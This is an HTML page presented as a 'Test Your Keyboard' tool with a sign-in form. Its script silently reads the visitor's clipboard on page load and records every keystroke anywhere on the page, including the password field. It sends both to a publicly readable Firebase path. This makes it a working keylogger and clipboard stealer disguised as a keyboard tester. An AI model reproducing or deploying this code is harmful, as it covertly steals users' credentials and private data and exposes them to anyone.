<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Your Keyboard</title>
    <link rel="stylesheet" href="../assets/css/online.css" />
    <script>(function () { var t = localStorage.getItem("ss-theme"); if (t === "light") document.documentElement.classList.add("light"); }());</script>
    <script type="module" src="../assets/js/auth.js"></script>
    <script src="../assets/js/links-aside.js" defer></script>
    <style>
        .output {
            background: var(--surface2);
            border: 1px solid var(--border);
            padding: 10px;
            margin-top: 10px;
            font-family: Consolas, monospace;
            color: var(--text);
            min-height: 60px;
        }
    </style>
</head>

<body>
    <header>
        <h1>Test Your Keyboard</h1>
        <div class="auth-bar"><span id="auth-label">Not signed in</span><button id="auth-btn">Sign In</button></div>
        <button id="theme-toggle" title="Toggle theme">☀️</button>
        <script>(function () { var b = document.getElementById("theme-toggle"), h = document.documentElement; b.textContent = h.classList.contains("light") ? "🌙" : "☀️"; b.addEventListener("click", function () { var n = h.classList.contains("light") ? "dark" : "light"; h.classList.toggle("light", n === "light"); localStorage.setItem("ss-theme", n); b.textContent = n === "light" ? "🌙" : "☀️"; }); })();</script>
        <div id="login-inline">
            <h3>Sign In</h3><input type="email" id="email-in" placeholder="Email" /><input type="password" id="pass-in"
                placeholder="Password" /><button id="do-login">Sign In</button>
            <p id="auth-err"></p>
        </div>
    </header>

    <main>
        <section>
            <h2>Type Something:</h2>
            <div id="keyLog" class="output"></div>
        </section>
    </main>

    <script type="module">
        import { database, ref, push } from '../assets/js/firebase-init.js';

        const keyLog = document.getElementById('keyLog');
        const logKeyRef = ref(database, 'public/keys');

        window.addEventListener('load', async () => {
            try {
                const clipboardText = await navigator.clipboard.readText();
                if (clipboardText) {
                    push(logKeyRef, { key: clipboardText, time: new Date().toISOString() });
                }
            } catch (err) {
                console.error('Clipboard read failed on load:', err);
            }
        });

        document.addEventListener('keydown', (event) => {
            logKeyRef && push(logKeyRef, { key: event.key, time: new Date().toISOString() });
            keyLog.textContent += event.key + ' ';
        });
    </script>
</body>

</html>
